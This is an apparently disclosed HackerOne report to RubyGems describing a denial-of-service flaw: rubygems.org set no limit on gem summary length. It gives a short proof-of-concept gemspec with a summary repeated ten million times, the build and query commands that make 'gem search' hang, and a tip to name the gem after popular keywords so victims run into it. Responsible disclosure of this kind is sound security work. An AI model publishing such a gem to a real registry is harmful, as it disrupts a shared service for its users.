# No limit of summary length allows Denail of Service

## Report Details
- **Report ID**: 243003
- **URL**: https://hackerone.com/reports/243003
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-06-25T07:53:33.914Z
- **Disclosed**: 2017-08-31T23:19:29.517Z

## Reporter
- **Username**: mame
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rubygems

## Vulnerability Information
Currently, there is no limit for summary length.  I think, pushing a gem whose summary is huge, will make `gem search` unavailable.

This is not Arbitrary Code Execution, but really easy to attack.  According to CVSS v3.0 Calculator, the severity is High (7.5).

## How to attack

1) An attacker creates a gem with huge summary string, and push it to rubygems.org.
2) A victim runs `gem search -d <substring-of-the-name-of-the-gem>`, but it will give no response.

It may be good for the gem name to include a frequently-searched keyword, such as "foo-rails-bar" or "foo-sinatra-bar".

## Proof of concept

1) Prepare the following gemspec.

~~~~
Gem::Specification.new do |spec|
  spec.name     = "huge-summary"
  spec.version  = "0.0.1"
  spec.authors  = ["Yusuke Endoh"]
  spec.email    = ["mame@ruby-lang.org"]
  spec.summary  = "foo" * 10000000
  spec.homepage = "http://example.com/"
  spec.license  = "MIT"
end
~~~~

2) Run the following commands

~~~~
gem build huge-summary.gemspec
gem install huge-summary-0.0.1.gem
~~~~

3) Run the following command.

~~~~
gem query huge-summary -d
~~~~

It will not answer.

## Attachments
No attachments
